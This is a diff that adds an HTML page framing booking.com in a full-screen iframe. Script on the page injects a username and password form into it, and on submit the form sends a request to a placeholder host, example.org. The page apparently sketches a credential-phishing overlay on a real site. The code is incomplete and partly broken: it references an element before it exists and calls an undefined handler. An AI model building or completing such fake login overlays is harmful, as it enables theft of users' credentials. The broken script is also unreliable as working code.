@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<script type="text/css"></script>
+<script type="text/javascript">
+
+document.getElementById("iframe").height = screen.height;
+
+var f = document.createElement("form");
+f.setAttribute('method',"post");
+f.setAttribute('action',"submit");
+f.setAttribute('id', 'form')
+f.setAttribute('class', 'form')
+
+var i = document.createElement("input"); //input element, text
+i.setAttribute('type',"text");
+i.setAttribute('name',"username");
+
+var p = document.createElement("input"); //input element, text
+p.setAttribute('type',"password");
+p.setAttribute('name',"passwort");
+
+var s = document.createElement("input"); //input element, Submit button
+s.setAttribute('type',"submit");
+s.setAttribute('value',"Submit");
+
+f.appendChild(i);
+f.appendChild(p);
+f.appendChild(s);
+
+document.getElementsByTagName('body')[0].appendChild(f);
+
+
+f.addEventListener("submit", function (e) {
+	var oReq = new XMLHttpRequest();
+	oReq.addEventListener("load", reqListener);
+	oReq.open("GET", "http://www.example.org/example.txt");
+	oReq.send();
+});
+
+</script>
+<body>
+
+<!--<iframe src="http://www.digitec.ch" id="iframe" width="100%" onload="this.height=screen.height;"></iframe>-->
+<iframe src="https://www.booking.com/index.de.html?label=gen173nr-1DCAEoggJCAlhYSDNiBW5vcmVmaCyIAQGYAQfCAQp3aW5kb3dzIDEwyAEU2AED6AEBkgIBeagCAw;sid=a048e5497fc2cd62d782d0d7a811cba7;sb_price_type=total&" id="iframe" width="100%" onload="this.height=screen.height;"></iframe>
+
+</body>
+</html>
